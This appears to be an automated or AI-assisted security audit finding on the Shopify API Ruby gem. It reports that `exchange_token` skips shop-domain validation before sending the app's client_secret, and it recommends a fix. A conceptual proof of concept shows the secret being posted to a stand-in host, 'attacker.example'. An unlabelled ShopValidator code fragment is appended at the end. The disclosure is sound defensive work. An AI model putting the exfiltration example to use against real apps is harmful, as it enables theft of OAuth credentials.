This is the key finding: `TokenExchange.exchange_token` is the only OAuth-credential-sending flow in the library that skips `Utils::ShopValidator.sanitize!` on the shop value before using it to build the HTTP request URL and to send the app's `client_id`/`client_secret`.

### Title
`TokenExchange.exchange_token` sends `client_secret` to an unvalidated host derived from the JWT `dest` claim - (File: `lib/shopify_api/auth/token_exchange.rb`)

### Summary
Every other credential-sending flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) calls `Utils::ShopValidator.sanitize!(shop)` before using the `shop` value to build the request host in `Clients::HttpClient`. [1](#0-0) [2](#0-1) [3](#0-2)  `TokenExchange.exchange_token`, however, takes `dest_shop = jwt_payload.shop` straight from the decoded JWT `dest` claim without ever passing it through `ShopValidator.sanitize!`, and uses it directly to construct `Auth::Session` and the `Clients::HttpClient` that will POST the app's `client_id`/`client_secret` body. [4](#0-3) 

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the `dest` claim with no format or domain validation: `@dest.gsub("https://", "")`. [5](#0-4)  The only integrity check performed on the token is the JWT signature (verified against `Context.api_secret_key`) and that `aud == Context.api_key`. [6](#0-5)  There is no check that `dest` is a trusted `*.myshopify.com`/`*.myshopify.io`/etc. domain, unlike `ShopValidator.sanitize!`, which enforces membership in `TRUSTED_SHOPIFY_DOMAINS`. [7](#0-6) 

`Clients::HttpClient#initialize` builds the outbound request host directly from `session.shop`: `@base_uri = "https://#{api_host || session.shop}"`. [8](#0-7)  Because `exchange_token` builds `shop_session` from the unvalidated `dest_shop` and then does `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`, the request carrying the app's `client_secret` in its JSON body is sent to whatever host is present in `dest_shop`. [9](#0-8) 

The binding that should hold is: *the host that receives the app's `client_secret` == a Shopify-trusted domain*, exactly as enforced in the other three flows via `ShopValidator.sanitize!`. In `exchange_token` this binding is instead: *the host that receives the `client_secret` == whatever string is embedded in the JWT's `dest` claim, unchecked*.

### Impact Explanation
If this binding is ever broken — e.g. by any bug in the token's issuance path, a customized/alternate token issuer, a future change to how `dest` is populated, or reuse of this code against a token whose `dest` was not strictly constrained to `*.myshopify.com` domains — the library would happily leak the app's `client_id`/`client_secret` to an attacker-controlled host, constituting SSRF/credential exfiltration with the app's `client_secret` (a Critical/High-severity outcome per the impact categories: SSRF or credential leakage carrying the app's own OAuth secret). Even absent a forgeable token today, this is a real defense-in-depth gap: three sibling functions in the exact same file/module treat `shop` as untrusted input requiring sanitization before being used as a network destination for secret material, while `exchange_token` does not, which is inconsistent with the rest of the gem's own security model for this exact operation.

### Likelihood Explanation
Exploitation as an unprivileged internet user requires a mechanism to influence the `dest` claim in a token that passes `JWT.decode` verification against `Context.api_secret_key`/`old_api_secret_key`. Under Shopify's current session-token issuance process, `dest` should be constrained by Shopify's Admin infrastructure, and normal HS256 signature verification would prevent low-privilege forgery of that claim without the secret. This limits practical, unprivileged exploitability today (hence Medium rather than higher likelihood), but it is a structural inconsistency in this gem's own code — the same class of "trusted field not re-validated against the value that ends up carrying the credential" issue described in the analog report (casted/parsed value used to authorize an action without re-validation against the check applied elsewhere in the same codebase).

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` (or equivalent) on `jwt_payload.shop` in `TokenExchange.exchange_token` before constructing `shop_session`/`Clients::HttpClient`, mirroring the pattern already used in `client_credentials`, `refresh_access_token`, and `migrate_to_expiring_token`, so the host that receives `client_id`/`client_secret` is always constrained to `ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
Conceptual (illustrates the missing binding, not a working exploit given current JWT signing constraints):
```ruby
# If a JWT with dest: "attacker.example" could ever pass JwtPayload's checks
# (signature + aud match only — no domain allow-list check on `dest`):
session_token = <token with aud=Context.api_key, dest="attacker.example">
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: session_token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::OFFLINE_ACCESS_TOKEN,
)
# -> Clients::HttpClient posts { client_id, client_secret, ... } to
#    https://attacker.example/admin/oauth/access_token
# Compare to client_credentials/refresh_access_token/migrate_to_expiring_token,
# which all call Utils::ShopValidator.sanitize!(shop) first and would raise
# ShopifyAPI::Errors::InvalidShopError for "attacker.example".
```

          "shopify.com",

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
